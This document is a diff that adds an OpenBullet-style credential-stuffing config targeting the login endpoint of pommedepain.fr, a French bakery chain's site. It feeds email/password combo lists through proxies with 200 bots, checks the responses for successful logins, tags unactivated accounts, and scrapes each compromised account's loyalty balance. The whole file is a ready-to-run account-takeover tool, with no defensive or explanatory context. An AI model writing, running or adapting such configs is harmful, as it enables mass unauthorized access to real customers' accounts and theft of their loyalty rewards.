@@ -1,0 +1,60 @@
+[SETTINGS]
+{
+  "Name": "Pomedepain",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2019-06-04T21:49:23.6926931+02:00",
+  "AdditionalInfo": "",
+  "Author": "xX-365094-Xx",
+  "Version": "1.2.8 Anomaly",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://pommedepain.fr/wp-admin/admin-ajax.php?action=get_user_token" 
+  CONTENT "email=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Host: pommedepain.fr" 
+  HEADER "Origin: https://pommedepain.fr" 
+  HEADER "Referer: https://pommedepain.fr/login/" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "{\"status\":\"ko\",\"message\":\"Identifiant ou mot de passe incorrect\"}" 
+  KEYCHAIN Success OR 
+    KEY "{\"status\":\"success\",\"urlRedirect\":\"https:\\/\\/pommedepain.fr\\/fidelite\\/\"}" 
+
+REQUEST GET "https://pommedepain.fr/fidelite/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "votre compte n'est toujours pas activé" 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "votre compte n'est toujours pas activé" 
+
+PARSE "<SOURCE>" LR "span class=\"balance-result\">" "<" Recursive=TRUE -> CAP "Cagnotte" 
+
